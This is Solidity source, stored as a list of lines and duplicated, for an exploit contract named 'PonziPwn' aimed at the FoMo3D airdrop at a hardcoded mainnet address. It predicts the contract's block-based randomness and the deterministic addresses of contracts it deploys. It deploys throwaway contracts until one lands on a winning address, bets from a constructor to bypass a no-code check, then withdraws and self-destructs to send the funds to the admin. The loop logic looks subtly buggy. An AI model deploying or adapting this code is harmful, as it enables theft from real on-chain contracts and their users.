['pragma solidity ^0.4.24;\n', '\n', 'interface FoMo3DlongInterface {\n', '    function airDropTracker_() external returns (uint256);\n', '    function airDropPot_() external returns (uint256);\n', '    function withdraw() external;\n', '}\n', '\n', '/* \n', ' * Contract addresses are deterministic. \n', ' * We find out how many deployments it&#39;ll take to get a winning contract address\n', ' * then deploy blank contracts until we get to the second last number of deployments to generate a successful address.\n', '*/\n', 'contract BlankContract {\n', '    constructor() public {}\n', '}\n', '\n', '//contract which will win the airdrop\n', 'contract AirDropWinner {\n', '    //point to Fomo3d Contract\n', '    FoMo3DlongInterface private fomo3d = FoMo3DlongInterface(0xA62142888ABa8370742bE823c1782D17A0389Da1);\n', '    /*\n', '     * 0.1 ether corresponds the amount to send to Fomo3D for a chance at winning the airDrop\n', '     * This is sent within the constructor to bypass a modifier that checks for blank code from the message sender\n', '     * As during construction a contract&#39;s code is blank.\n', '     * We then withdraw all earnings from fomo3d and selfdestruct to returns all funds to the main exploit contract.\n', '     */\n', '    constructor() public {\n', '        if(!address(fomo3d).call.value(0.1 ether)()) {\n', '           fomo3d.withdraw();\n', '           selfdestruct(msg.sender);\n', '        }\n', '\n', '    }\n', '}\n', '\n', 'contract PonziPwn {\n', '    FoMo3DlongInterface private fomo3d = FoMo3DlongInterface(0xA62142888ABa8370742bE823c1782D17A0389Da1);\n', '    \n', '    address private admin;\n', '    uint256 private blankContractGasLimit = 20000;\n', '    uint256 private pwnContractGasLimit = 250000;\n', '       \n', '    //gasPrice you&#39;ll use during the exploit\n', '    uint256 private gasPrice = 10;\n', '    uint256 private gasPriceInWei = gasPrice*1e9;\n', '    \n', '    //cost of deploying each contract\n', '    uint256 private blankContractCost = blankContractGasLimit*gasPrice ;\n', '    uint256 private pwnContractCost = pwnContractGasLimit*gasPrice;\n', '    uint256 private maxAmount = 10 ether;\n', '    \n', '    modifier onlyAdmin() {\n', '        require(msg.sender == admin);\n', '        _;\n', '    }\n', '\n', '    constructor() public {\n', '        admin = msg.sender;\n', '    }\n', '\n', '    function checkPwnData() private returns(uint256,uint256,address) {\n', '        //The address that a contract deployed by this contract will have\n', '        address _newSender = address(keccak256(abi.encodePacked(0xd6, 0x94, address(this), 0x01)));\n', '        uint256 _nContracts = 0;\n', '        uint256 _pwnCost = 0;\n', '        uint256 _seed = 0;\n', '        uint256 _tracker = fomo3d.airDropTracker_();\n', '        bool _canWin = false;\n', '        while(!_canWin) {\n', '            /* \n', '\t     * How the seed if calculated in fomo3d.\n', '             * We input a new address each time until we get to a winning seed.\n', '            */\n', '            _seed = uint256(keccak256(abi.encodePacked(\n', '                   (block.timestamp) +\n', '                   (block.difficulty) +\n', '                   ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)) +\n', '                   (block.gaslimit) +\n', '                   ((uint256(keccak256(abi.encodePacked(_newSender)))) / (now)) +\n', '                   (block.number)\n', '            )));\n', '\n', '            //Tally number of contract deployments that&#39;ll result in a win. \n', '            //We tally the cost of deploying blank contracts.\n', '            if((_seed - ((_seed / 1000) * 1000)) >= _tracker) {\n', '                    _newSender = address(keccak256(abi.encodePacked(0xd6, 0x94, _newSender, 0x01)));\n', '                    _nContracts++;\n', '                    _pwnCost+= blankContractCost;\n', '            } else {\n', '                    _canWin = true;\n', '                    //Add the cost of deploying a contract that will result in the winning of an airdrop\n', '                    _pwnCost += pwnContractCost;\n', '            }\n', '        }\n', '        return (_pwnCost,_nContracts,_newSender);\n', '    }\n', '\n', '    function deployContracts(uint256 _nContracts,address _newSender) private {\n', '        /* \n', '\t * deploy blank contracts until the final index at which point we first send ETH to the pregenerated address then deploy\n', '         * an airdrop winning contract which will have that address;\n', '        */\n', '        for(uint256 _i; _i < _nContracts; _i++) {\n', '            if(_i++ == _nContracts) {\n', '               address(_newSender).call.value(0.1 ether)();\n', '               new AirDropWinner();\n', '            }\n', '            new BlankContract();\n', '        }\n', '    }\n', '\n', '    //main method\n', '    function beginPwn() public onlyAdmin() {\n', '        uint256 _pwnCost;\n', '        uint256 _nContracts;\n', '        address _newSender;\n', '        (_pwnCost, _nContracts,_newSender) = checkPwnData();\n', '        \n', '\t//check that the cost of executing the attack will make it worth it\n', '        if(_pwnCost + 0.1 ether < maxAmount) {\n', '           deployContracts(_nContracts,_newSender);\n', '        }\n', '    }\n', '\n', '    //allows withdrawal of funds after selfdestructing of a child contract which return funds to this contract\n', '    function withdraw() public onlyAdmin() {\n', '        admin.transfer(address(this).balance);\n', '    }\n', '}']
['pragma solidity ^0.4.24;\n', '\n', 'interface FoMo3DlongInterface {\n', '    function airDropTracker_() external returns (uint256);\n', '    function airDropPot_() external returns (uint256);\n', '    function withdraw() external;\n', '}\n', '\n', '/* \n', ' * Contract addresses are deterministic. \n', " * We find out how many deployments it'll take to get a winning contract address\n", ' * then deploy blank contracts until we get to the second last number of deployments to generate a successful address.\n', '*/\n', 'contract BlankContract {\n', '    constructor() public {}\n', '}\n', '\n', '//contract which will win the airdrop\n', 'contract AirDropWinner {\n', '    //point to Fomo3d Contract\n', '    FoMo3DlongInterface private fomo3d = FoMo3DlongInterface(0xA62142888ABa8370742bE823c1782D17A0389Da1);\n', '    /*\n', '     * 0.1 ether corresponds the amount to send to Fomo3D for a chance at winning the airDrop\n', '     * This is sent within the constructor to bypass a modifier that checks for blank code from the message sender\n', "     * As during construction a contract's code is blank.\n", '     * We then withdraw all earnings from fomo3d and selfdestruct to returns all funds to the main exploit contract.\n', '     */\n', '    constructor() public {\n', '        if(!address(fomo3d).call.value(0.1 ether)()) {\n', '           fomo3d.withdraw();\n', '           selfdestruct(msg.sender);\n', '        }\n', '\n', '    }\n', '}\n', '\n', 'contract PonziPwn {\n', '    FoMo3DlongInterface private fomo3d = FoMo3DlongInterface(0xA62142888ABa8370742bE823c1782D17A0389Da1);\n', '    \n', '    address private admin;\n', '    uint256 private blankContractGasLimit = 20000;\n', '    uint256 private pwnContractGasLimit = 250000;\n', '       \n', "    //gasPrice you'll use during the exploit\n", '    uint256 private gasPrice = 10;\n', '    uint256 private gasPriceInWei = gasPrice*1e9;\n', '    \n', '    //cost of deploying each contract\n', '    uint256 private blankContractCost = blankContractGasLimit*gasPrice ;\n', '    uint256 private pwnContractCost = pwnContractGasLimit*gasPrice;\n', '    uint256 private maxAmount = 10 ether;\n', '    \n', '    modifier onlyAdmin() {\n', '        require(msg.sender == admin);\n', '        _;\n', '    }\n', '\n', '    constructor() public {\n', '        admin = msg.sender;\n', '    }\n', '\n', '    function checkPwnData() private returns(uint256,uint256,address) {\n', '        //The address that a contract deployed by this contract will have\n', '        address _newSender = address(keccak256(abi.encodePacked(0xd6, 0x94, address(this), 0x01)));\n', '        uint256 _nContracts = 0;\n', '        uint256 _pwnCost = 0;\n', '        uint256 _seed = 0;\n', '        uint256 _tracker = fomo3d.airDropTracker_();\n', '        bool _canWin = false;\n', '        while(!_canWin) {\n', '            /* \n', '\t     * How the seed if calculated in fomo3d.\n', '             * We input a new address each time until we get to a winning seed.\n', '            */\n', '            _seed = uint256(keccak256(abi.encodePacked(\n', '                   (block.timestamp) +\n', '                   (block.difficulty) +\n', '                   ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)) +\n', '                   (block.gaslimit) +\n', '                   ((uint256(keccak256(abi.encodePacked(_newSender)))) / (now)) +\n', '                   (block.number)\n', '            )));\n', '\n', "            //Tally number of contract deployments that'll result in a win. \n", '            //We tally the cost of deploying blank contracts.\n', '            if((_seed - ((_seed / 1000) * 1000)) >= _tracker) {\n', '                    _newSender = address(keccak256(abi.encodePacked(0xd6, 0x94, _newSender, 0x01)));\n', '                    _nContracts++;\n', '                    _pwnCost+= blankContractCost;\n', '            } else {\n', '                    _canWin = true;\n', '                    //Add the cost of deploying a contract that will result in the winning of an airdrop\n', '                    _pwnCost += pwnContractCost;\n', '            }\n', '        }\n', '        return (_pwnCost,_nContracts,_newSender);\n', '    }\n', '\n', '    function deployContracts(uint256 _nContracts,address _newSender) private {\n', '        /* \n', '\t * deploy blank contracts until the final index at which point we first send ETH to the pregenerated address then deploy\n', '         * an airdrop winning contract which will have that address;\n', '        */\n', '        for(uint256 _i; _i < _nContracts; _i++) {\n', '            if(_i++ == _nContracts) {\n', '               address(_newSender).call.value(0.1 ether)();\n', '               new AirDropWinner();\n', '            }\n', '            new BlankContract();\n', '        }\n', '    }\n', '\n', '    //main method\n', '    function beginPwn() public onlyAdmin() {\n', '        uint256 _pwnCost;\n', '        uint256 _nContracts;\n', '        address _newSender;\n', '        (_pwnCost, _nContracts,_newSender) = checkPwnData();\n', '        \n', '\t//check that the cost of executing the attack will make it worth it\n', '        if(_pwnCost + 0.1 ether < maxAmount) {\n', '           deployContracts(_nContracts,_newSender);\n', '        }\n', '    }\n', '\n', '    //allows withdrawal of funds after selfdestructing of a child contract which return funds to this contract\n', '    function withdraw() public onlyAdmin() {\n', '        admin.transfer(address(this).balance);\n', '    }\n', '}']
